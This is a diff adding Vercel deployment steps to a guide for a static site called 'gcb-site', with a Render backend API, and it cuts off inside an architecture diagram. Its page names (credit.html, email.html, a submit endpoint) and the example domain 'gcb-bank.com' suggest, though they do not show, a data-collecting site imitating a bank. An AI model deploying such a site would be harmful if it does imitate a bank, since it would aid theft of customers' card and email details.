@@ -135,4 +135,59 @@ Click **"Advanced"** → **"Add Environment Variable"** and add these **exact va
 | `DB_PORT` | `16543` (the port from Aiven — might be different for you!) |
 | `DB_SSL` | `true` |
 
->
+---
+
+## ✅ Step 3: Deploy Frontend to Vercel (Free)
+
+### 3.1. Create a Vercel Account
+1. Go to **[https://vercel.com](https://vercel.com)**
+2. Click **"Sign Up"** → **"Continue with GitHub"** (easiest — connects to your repo)
+3. Grant GitHub access when prompted
+
+### 3.2. Import Your Repository
+1. From the Vercel Dashboard, click **"Add New..."** → **"Project"**
+2. Find and select your GitHub repository: **`gods80eye08-debug/gcb-site`**
+3. Click **"Import"**
+
+### 3.3. Configure the Project
+Vercel will auto-detect the project settings. Verify these:
+
+| Setting | Value |
+|---------|-------|
+| **Framework Preset** | **Other** (static HTML) |
+| **Root Directory** | `./` (project root) |
+| **Build Command** | *(leave empty — no build needed)* |
+| **Output Directory** | `public` (this is where your HTML files are) |
+| **Install Command** | *(leave empty — no dependencies needed for frontend)* |
+
+> ⚠️ **Important:** Set the **Output Directory** to `public` because all your static files (index.html, credit.html, email.html, success.html, css/, js/, images/) are inside the `public/` folder.
+
+### 3.4. Environment Variables (Optional for Frontend)
+No environment variables are needed for the frontend. The API URL is already configured in `public/js/email.js`:
+- **Local:** `http://127.0.0.1:3000/api/submit`
+- **Production:** `https://gcb-site-backend.onrender.com/api/submit`
+
+### 3.5. Deploy!
+1. Click **"Deploy"**
+2. Wait ~1 minute for Vercel to build and deploy
+3. Once complete, Vercel will show you your live URL:
+
+   ```
+   https://gcb-site.vercel.app
+   ```
+
+### 3.6. (Optional) Custom Domain
+1. In your Vercel project dashboard, go to **"Settings"** → **"Domains"**
+2. Enter your custom domain (e.g., `gcb-bank.com`)
+3. Follow Vercel's DNS configuration instructions
+
+---
+
+## ✅ Final Architecture
+
+```
+User's Browser
+       │
+       ▼
+┌─────────────────────┐
+│   Vercel (Frontend) │  https://gcb-site
